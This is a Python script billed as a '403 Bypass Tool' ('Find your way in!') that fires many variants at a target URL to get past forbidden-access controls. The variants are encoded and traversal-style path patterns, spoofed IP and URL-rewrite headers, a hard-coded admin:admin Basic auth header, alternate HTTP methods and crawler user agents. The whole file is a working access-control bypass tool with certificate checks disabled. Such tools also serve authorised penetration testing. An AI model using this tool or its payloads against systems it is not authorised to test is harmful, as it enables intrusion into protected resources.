#!/usr/bin/env python3
import requests
import sys
import json
import re
import concurrent.futures
from urllib.parse import urljoin, urlparse
import urllib3
import argparse
import time
import random
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Default Chrome User-Agent
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Path bypass patterns
PATH_BYPASS_PATTERNS = [
    "{path}",
    "%2e/{path}",
    "{path}/.",
    "//{path}//",
    "./{path}/./",
    "{path}%20",
    "{path}%09",
    "{path}?",
    "{path}.html",
    "{path}/?anything",
    "{path}#",
    "{path}/*",
    "{path}.php",
    "{path}.json",
    "{path}..;/",
    "{path};/",
    # Additional effective patterns
    "%2f{path}",
    "../{path}",
    "{path}//",
    "/%2e/{path}",
    "/..;/{path}",
    "/{path}/..",
    "/./{path}/.",
    "/{path}/.;/",
    "{path}?param=1",
    "{path}&",
    "{path}%23",
    "{path}%3f",
    "{path}%26",
    "{path}#fragment",
    "{path}#!",
    "{path}/~",
    "{path}~",
    "{path}%u2215"
]

# Header bypass techniques
HEADER_BYPASS = {
    "X-Original-URL": "{path}",
    "X-Rewrite-URL": "{path}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "Forwarded": "for=127.0.0.1",
    "X-Forwarded-For": "localhost",
    "X-Forwarded-For": "spoofed.com",
    "Referer": "{base_url}",
    "X-Api-Version": "1",
    "Content-Length": "0",
    "Authorization": "Basic YWRtaW46YWRtaW4="
}

# HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT", "HEAD", "PROPFIND"]

# User agents to test
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 compatible Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0",
    "facebookexternalhit/1.1"
]

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='403 Bypass Tool - Test various techniques to bypass 403 Forbidden responses')
    parser.add_argument('url', help='Target URL (e.g., http://example.com/admin)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display detailed output')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('--no-wayback', action='store_true', help='Skip Wayback Machine check')
    parser.add_argument('--user-agents', action='store_true', help='Test different user agents')
    parser.add_argument('--methods', action='store_true', help='Test different HTTP methods')
    
    return parser.parse_args()

def request_url(base_url, path, headers=None, method="GET", timeout=5, verbose=False):
    """Make an HTTP request while ignoring SSL errors, with timeout."""
    url = urljoin(base_url, path)
    try:
        response = requests.request(
            method, 
            url, 
            headers=headers or DEFAULT_HEADERS, 
            verify=False, 
            allow_redirects=True, 
            timeout=timeout
        )
        
        if verbose:
            print(f"Request: {method} {url}")
            print(f"Headers: {headers}")
            print(f"Response: {response.status_code}")
        
        return response.status_code, len(response.content)
    except requests.RequestException as e:
        return None, f"Error: {str(e)}"

def extract_base_and_path(url):
    """Split URL into base and path."""
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    path = parsed_url.path.lstrip('/')
    
    # Handle case where only domain is provided
    if not path:
        path = ""
    
    return base_url, path

def print_result(test_identifier, status_code, size, base_url, path="", use_color=True):
    """Display formatted results highlighting responses different from 403."""
    display_path = path if path else test_identifier
    url = f"{base_url}/{display_path}"
    
    if use_color:
        if status_code == 403:
            color = Fore.RED
        elif status_code == 200:
            color = Fore.GREEN
        elif status_code is None:
            color = Fore.YELLOW
        else:
            color = Fore.CYAN
            
        print(f"{color}{url} --> {status_code}, {size} bytes{Style.RESET_ALL}")
    else:
        print(f"{url} --> {status_code}, {size} bytes")
    
    return status_code, size, url

def check_wayback(base_url, path, use_color=True):
    """Query Wayback Machine to check if URL has been archived."""
    print("\n" + ("-" * 60))
    print("Checking Wayback Machine archives...")
    wayback_url = f"https://archive.org/wayback/available?url={base_url}/{path}"
    
    try:
        wayback_response = requests.get(wayback_url, timeout=5).json()
        snapshot = wayback_response.get("archived_snapshots", {}).get("closest", {})
        
        if snapshot:
            if use_color:
                print(f"{Fore.BLUE}[Wayback Machine] Archive found:{Style.RESET_ALL}")
                print(f"{Fore.BLUE}{json.dumps(snapshot, indent=2)}{Style.RESET_ALL}")
            else:
                print("[Wayback Machine] Archive found:")
                print(json.dumps(snapshot, indent=2))
        else:
            if use_color:
                print(f"{Fore.YELLOW}[Wayback Machine] No archives found.{Style.RESET_ALL}")
            else:
                print("[Wayback Machine] No archives found.")
    except Exception as e:
        if use_color:
            print(f"{Fore.RED}Error querying Wayback Machine: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"Error querying Wayback Machine: {str(e)}")

def save_results(results, output_file):
    """Save successful bypass results to a file."""
    try:
        with open(output_file, 'w') as f:
            f.write("403 Bypass Tool - Successful Results\n")
            f.write("=" * 50 + "\n\n")
            
            for result in results:
                status_code, size, url = result
                f.write(f"{url} --> {status_code}, {size} bytes\n")
                
        print(f"\nResults saved to {output_file}")
    except Exception as e:
        print(f"Error saving results: {str(e)}")

def print_banner():
    """Display tool banner."""
    banner = r"""
 _  _    ___ ____    ____               
| || |  / _ \___ \  |  _ \             
| || |_| | | |__) | | |_) |_   _ _ __  
|__   _| | | |__ <  |  _ <| | | | '_ \ 
   | | | |_| |__) | | |_) | |_| | | | |
   |_|  \___/____/  |____/ \__, |_| |_|
                           __/ |      
                          |___/       
    403 Bypass Tool v2.0 - Find your way in!
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def run_bypass(base_url, path, args):
    """Execute bypass tests in parallel for better performance."""
    print_banner()
    print(f"\n[+] Target: {base_url}/{path}")
    print(f"[+] Starting bypass tests with {args.threads} threads...\n")
    
    # Initial request to check the actual response
    status_code, size = request_url(base_url, path, timeout=args.timeout)
    print(f"Initial request to {base_url}/{path} returned: {status_code}, {size} bytes\n")
    
    if status_code != 403:
        print(f"Note: Target is not returning 403 Forbidden (got {status_code}). Running tests anyway...\n")
    
    bypass_tests = []
    successful_results = []

    # Create list of path tests
    for pattern in PATH_BYPASS_PATTERNS:
        test_path = pattern.format(path=path)
        bypass_tests.append(("PATH", test_path))

    # Create list of header tests
    for header, value in HEADER_BYPASS.items():
        headers = DEFAULT_HEADERS.copy()
        if "{path}" in value:
            headers[header] = value.format(path=path)
        elif "{base_url}" in value:
            headers[header] = value.format(base_url=base_url)
        else:
            headers[header] = value
        bypass_tests.append(("HEADER", path, header, headers))

    # Test HTTP methods if requested
    if args.methods:
        for method in HTTP_METHODS:
            bypass_tests.append(("METHOD", path, method))

    # Test user agents if requested
    if args.user_agents:
        for user_agent in USER_AGENTS:
            headers = DEFAULT_HEADERS.copy()
            headers["User-Agent"] = user_agent
            bypass_tests.append(("USER_AGENT", path, user_agent, headers))

    # Create thread pool for parallel requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_test = {}

        # Submit path tests
        for bypass_type, test_path in [t for t in bypass_tests if t[0] == "PATH"]:
            future = executor.submit(
                request_url, base_url, test_path, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, test_path)

        # Submit header tests
        for bypass_type, path, header, headers in [t for t in bypass_tests if t[0] == "HEADER"]:
            future = executor.submit(
                request_url, base_url, path, headers, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, header)

        # Submit method tests
        for bypass_type, path, method in [t for t in bypass_tests if t[0] == "METHOD"]:
            future = executor.submit(
                request_url, base_url, path, method=method, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, method)

        # Submit user agent tests
        for bypass_type, path, agent, headers in [t for t in bypass_tests if t[0] == "USER_AGENT"]:
            future = executor.submit(
                request_url, base_url, path, headers, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, "User-Agent: " + agent[:30] + "...")

        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_test):
            bypass_type, *params = future_to_test[future]
            try:
                status_code, size = future.result()
                
                if status_code is not None:
                    if bypass_type == "PATH":
                        result = print_result(params[0], status_code, size, base_url, use_color=not args.no_color)
                    elif bypass_type in ["HEADER", "USER_AGENT"]:
                        result = print_result(f"{params[0]} ({params[1]})", status_code, size, base_url, use_color=not args.no_color)
                    elif bypass_type == "METHOD":
                        result = print_result(f"{params[0]} ({params[1]})", status_code, size, base_url, use_color=not args.no_color)
                    
                    # Save successful bypasses (non-403 responses)
                    if status_code != 403:
                        successful_results.append(result)
            except Exception as exc:
                print(f"Error in {params}: {exc}")

    # Check Wayback Machine if not disabled
    if not args.no_wayback:
        check_wayback(base_url, path, use_color=not args.no_color)
    
    # Display summary
    print("\n" + ("-" * 60))
    print(f"Summary: {len(successful_results)} successful bypass attempts out of {len(bypass_tests)} tests")
    
    # Save results if output file specified
    if args.output and successful_results:
        save_results(successful_results, args.output)

if __name__ == "__main__":
    try:
        args = parse_arguments()
        base_url, path = extract_base_and_path(args.url)
        run_bypass(base_url, path, args)
    except KeyboardInterrupt:
        print("\nOperation cancelled by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)
